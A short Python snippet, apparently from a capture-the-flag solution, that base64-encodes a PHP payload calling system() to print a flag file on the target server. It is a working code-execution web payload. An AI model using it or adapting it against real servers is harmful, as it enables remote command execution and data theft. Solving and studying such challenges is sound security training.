import base64
msg = '<?php system("cat fl4gisisish3r3.php")?>'
msg = msg.encode('utf-8')
print(base64.b64encode(msg))